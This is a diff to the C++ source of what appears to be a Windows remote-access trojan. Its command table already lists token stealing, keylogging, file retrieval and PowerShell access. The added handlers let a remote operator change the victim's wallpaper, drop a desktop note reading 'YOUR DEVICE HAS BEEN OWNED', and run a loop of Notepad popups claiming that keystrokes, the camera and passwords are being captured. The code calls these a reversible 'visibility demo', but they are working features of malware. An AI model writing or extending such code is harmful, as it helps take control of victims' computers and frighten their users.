@@ -1282,6 +1282,221 @@ static std::wstring HandlePsReset(const std::string&) {
     return PsSpawn() ? L"[+] PowerShell session restarted" : L"[error: restart failed]";
 }
 
+// ─── Visibility demo — wallpaper + desktop note (fully reversible) ───────────
+// !prank <text>   swap wallpaper to the embedded image, drop READ_ME.txt on
+//                 the desktop, pop it in Notepad
+// !prank off      restore the original wallpaper and remove the note
+static bool WriteResourceToFile(UINT resId, const wchar_t* dest) {
+    HRSRC hr = FindResourceW(nullptr, MAKEINTRESOURCEW(resId), RT_RCDATA);
+    if (!hr) return false;
+    HGLOBAL hg = LoadResource(nullptr, hr);
+    if (!hg) return false;
+    const BYTE* data = static_cast<const BYTE*>(LockResource(hg));
+    DWORD size = SizeofResource(nullptr, hr);
+    if (!data || !size) return false;
+    HANDLE hf = CreateFileW(dest, GENERIC_WRITE, 0, nullptr,
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hf == INVALID_HANDLE_VALUE) return false;
+    DWORD wr = 0;
+    WriteFile(hf, data, size, &wr, nullptr);
+    CloseHandle(hf);
+    return wr == size;
+}
+
+static std::wstring HandlePrank(const std::string& args) {
+    wchar_t pub[MAX_PATH] = {};
+    if (!GetEnvironmentVariableW(L"PUBLIC", pub, MAX_PATH))
+        lstrcpyW(pub, L"C:\\Users\\Public");
+    std::wstring wallPath = std::wstring(pub) + L"\\ghost_wall.jpg";
+    std::wstring origPath = std::wstring(pub) + L"\\ghost_wall_orig.txt";
+
+    // Restore mode — put the original wallpaper back and clean up.
+    if (args == "off") {
+        HANDLE hf = CreateFileW(origPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
+                                nullptr, OPEN_EXISTING, 0, nullptr);
+        if (hf == INVALID_HANDLE_VALUE) return L"[error: no saved wallpaper to restore]";
+        wchar_t orig[260] = {}; DWORD rd = 0;
+        ReadFile(hf, orig, sizeof(orig) - 2, &rd, nullptr);
+        CloseHandle(hf);
+        if (!orig[0]) return L"[error: saved wallpaper path is empty]";
+        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (LPVOID)orig,
+                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+        wchar_t desk[MAX_PATH] = {};
+        SHGetFolderPathW(nullptr, CSIDL_DESKTOP, nullptr, 0, desk);
+        DeleteFileW((std::wstring(desk) + L"\\READ_ME.txt").c_str());
+        DeleteFileW(origPath.c_str());
+        DeleteFileW(wallPath.c_str());
+        return L"[+] wallpaper restored, note removed";
+    }
+
+    // Save the current wallpaper once, so `off` can restore it later.
+    if (GetFileAttributesW(origPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+        wchar_t cur[260] = {}; DWORD sz = sizeof(cur) - 2;
+        RegGetValueW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"Wallpaper",
+                     RRF_RT_REG_SZ, nullptr, cur, &sz);
+        HANDLE hf = CreateFileW(origPath.c_str(), GENERIC_WRITE, 0, nullptr,
+                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hf != INVALID_HANDLE_VALUE) {
+            DWORD w = 0;
+            WriteFile(hf, cur, static_cast<DWORD>(wcslen(cur) * 2), &w, nullptr);
+            CloseHandle(hf);
+        }
+    }
+
+    if (!WriteResourceToFile(100, wallPath.c_str()))
+        return L"[error: wallpaper resource missing]";
+    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, &wallPath[0],
+                          SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+
+    // Desktop note — UTF-16 LE with BOM so Notepad renders it cleanly.
+    wchar_t desk[MAX_PATH] = {};
+    SHGetFolderPathW(nullptr, CSIDL_DESKTOP, nullptr, 0, desk);
+    std::wstring note = std::wstring(desk) + L"\\READ_ME.txt";
+    std::wstring text = UTF8ToWString(args);
+    if (text.empty())
+        text = L"YOUR DEVICE HAS BEEN OWNED.\r\nAll access was logged.\r\n\r\n- @kalidada";
+    HANDLE hf = CreateFileW(note.c_str(), GENERIC_WRITE, 0, nullptr,
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hf == INVALID_HANDLE_VALUE)
+        return L"[+] wallpaper set, but the note write failed";
+    BYTE bom[2] = { 0xFF, 0xFE };
+    DWORD w = 0;
+    WriteFile(hf, bom, 2, &w, nullptr);
+    WriteFile(hf, text.c_str(), static_cast<DWORD>(text.size() * 2), &w, nullptr);
+    CloseHandle(hf);
+
+    // Pop the note in Notepad for immediate visibility.
+    std::wstring np = L"notepad.exe \"" + note + L"\"";
+    STARTUPINFOW si = {}; si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = {};
+    if (CreateProcessW(nullptr, &np[0], nullptr, nullptr, FALSE, 0,
+                       nullptr, nullptr, &si, &pi)) {
+        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+    }
+    return L"[+] wallpaper set, READ_ME.txt on desktop — !prank off to revert";
+}
+
+// ─── Random popup chaos (visibility demo) ────────────────────────────────────
+// !popups      open/close random scare popups at random screen positions
+// !popups off  stop the loop and close whatever is open
+static HANDLE g_popThread = nullptr;
+static volatile LONG g_popRunning = 0;
+static HANDLE g_lastPopProc = nullptr;
+static HWND   g_lastPopWnd  = nullptr;
+
+static const wchar_t* kPopTexts[] = {
+    L"SYSTEM COMPROMISED\n\nEvery keystroke is being logged.",
+    L"REMOTE ACCESS ACTIVE\n\n@kalidada is watching this screen.",
+    L"ALERT: Camera and microphone are ON.",
+    L"Your files are being copied right now.\nDo not turn off the computer.",
+    L"CONNECTION INTERCEPTED\n\nAll saved passwords have been exported.",
+    L"This machine belongs to @kalidada now.",
+    L"Data exfiltration in progress… 67%",
+    L"Firewall: OFF    Antivirus: BYPASSED\nYou are on your own.",
+};
+
+static DWORD PopRand(DWORD lo, DWORD hi) {
+    static std::mt19937 gen(static_cast<unsigned>(
+        std::random_device{}() ^ GetCurrentProcessId()));
+    return lo + gen() % (hi - lo + 1);
+}
+
+static BOOL CALLBACK MovePopWnd(HWND hwnd, LPARAM pid) {
+    DWORD wid = 0;
+    GetWindowThreadProcessId(hwnd, &wid);
+    if (wid == static_cast<DWORD>(pid)) {
+        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
+        SetWindowPos(hwnd, HWND_TOPMOST,
+                     static_cast<int>(PopRand(0, sw > 500 ? sw - 500 : 100)),
+                     static_cast<int>(PopRand(0, sh > 350 ? sh - 350 : 100)),
+                     0, 0, SWP_NOSIZE | SWP_NOZORDER);
+        g_lastPopWnd = hwnd;
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static DWORD WINAPI PopupThread(LPVOID) {
+    DebugLog(L"[pop] thread started");
+    wchar_t pub[MAX_PATH] = {};
+    if (!GetEnvironmentVariableW(L"PUBLIC", pub, MAX_PATH))
+        lstrcpyW(pub, L"C:\\Users\\Public");
+    std::wstring notePath = std::wstring(pub) + L"\\ghost_pop.txt";
+
+    while (InterlockedCompareExchange(&g_popRunning, 0, 0)) {
+        // random idle gap — deadline-based so it can't wrap, sliced so
+        // '!popups off' reacts within ~200 ms
+        DebugLog(L"[pop] idle start");
+        DWORD idleMs = PopRand(2500, 8000);
+        DWORD idleDeadline = GetTickCount() + idleMs;
+        while (g_popRunning &&
+               static_cast<int>(idleDeadline - GetTickCount()) > 0)
+            Sleep(200);
+        DebugLog(L"[pop] idle done, opening popup");
+        if (!g_popRunning) break;
+
+        const wchar_t* txt = kPopTexts[PopRand(0, ARRAYSIZE(kPopTexts) - 1)];
+        HANDLE hf = CreateFileW(notePath.c_str(), GENERIC_WRITE, 0, nullptr,
+                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hf == INVALID_HANDLE_VALUE) { DebugLog(L"[pop] note write FAILED"); break; }
+        BYTE bom[2] = { 0xFF, 0xFE }; DWORD w = 0;
+        WriteFile(hf, bom, 2, &w, nullptr);
+        WriteFile(hf, txt, static_cast<DWORD>(wcslen(txt) * 2), &w, nullptr);
+        CloseHandle(hf);
+
+        std::wstring cmd = L"notepad.exe \"" + notePath + L"\"";
+        STARTUPINFOW si = {}; si.cb = sizeof(si);
+        PROCESS_INFORMATION pi = {};
+        if (!CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, 0,
+                            nullptr, nullptr, &si, &pi)) {
+            DebugLog(L"[pop] CreateProcess FAILED err=" + std::to_wstring(GetLastError()));
+            break;
+        }
+        DebugLog(L"[pop] notepad spawned");
+        if (g_lastPopProc) CloseHandle(g_lastPopProc);
+        g_lastPopProc = pi.hProcess;
+        g_lastPopWnd  = nullptr;
+
+        Sleep(350);  // let the window materialize
+        if (g_popRunning)
+            EnumWindows(MovePopWnd, static_cast<LPARAM>(pi.dwProcessId));
+
+        // random lifetime, then close
+        DWORD lifeDeadline = GetTickCount() + PopRand(2000, 6000);
+        while (g_popRunning &&
+               static_cast<int>(lifeDeadline - GetTickCount()) > 0)
+            Sleep(200);
+        if (g_lastPopWnd) PostMessageW(g_lastPopWnd, WM_CLOSE, 0, 0);
+        if (WaitForSingleObject(pi.hProcess, 800) == WAIT_TIMEOUT)
+            TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        if (g_lastPopProc == pi.hProcess) { g_lastPopProc = nullptr; g_lastPopWnd = nullptr; }
+    }
+    return 0;
+}
+
+static std::wstring HandlePopups(const std::string& args) {
+    if (args == "off") {
+        if (!g_popRunning) return L"[popups: not running]";
+        InterlockedExchange(&g_popRunning, 0);
+        if (g_popThread) {
+            WaitForSingleObject(g_popThread, 10000);
+            CloseHandle(g_popThread);
+            g_popThread = nullptr;
+        }
+        if (g_lastPopWnd)  PostMessageW(g_lastPopWnd, WM_CLOSE, 0, 0);
+        if (g_lastPopProc) { TerminateProcess(g_lastPopProc, 0); CloseHandle(g_lastPopProc); g_lastPopProc = nullptr; }
+        g_lastPopWnd = nullptr;
+        return L"[+] popups stopped";
+    }
+    if (g_popRunning) return L"[popups: already running — !popups off to stop]";
+    InterlockedExchange(&g_popRunning, 1);
+    g_popThread = CreateThread(nullptr, 0, PopupThread, nullptr, 0, nullptr);
+    if (!g_popThread) { InterlockedExchange(&g_popRunning, 0); return L"[error: thread failed]"; }
+    return L"[+] random popups running — !popups off to stop";
+}
+
 // =====================================================================
 //  KILL PROCESS
 // =====================================================================
@@ -1342,6 +1557,10 @@ static const CmdEntry kCmdTable[] = {
     { "!files",        true,  HandleFiles },
     { "!files ",       false, HandleFiles },
     { "!getfile ",     false, HandleGetFile },
+    { "!prank ",       false, HandlePrank },
+    { "!prank",        true,  HandlePrank },
+    { "!popups",       true,  HandlePopups },
+    { "!popups ",      false, HandlePopups },
     { "!uninstall",    true,  HandleUninstall },
     { "steal_token",   true,  HandleStealToken },
     { "keylog_start",  true,  HandleKeylogStart },
